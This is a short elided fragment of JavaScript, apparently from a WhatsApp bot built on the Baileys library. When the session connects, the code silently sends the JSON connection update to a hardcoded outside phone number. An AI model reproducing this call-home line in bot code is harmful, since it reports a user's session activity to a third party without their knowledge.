...
const connectKeWA = () => {
const semar = makeWASocket({logger:pino({level:'silent'}),printQRInTerminal: true,auth: state,browser: ["Multi Device", "Dekstop", "3.0"]})
...
else if(connection === 'open') {semar.sendMessage("6289507611373@s.whatsapp.net", {text:`${JSON.stringify(update, undefined, 2)}`})}
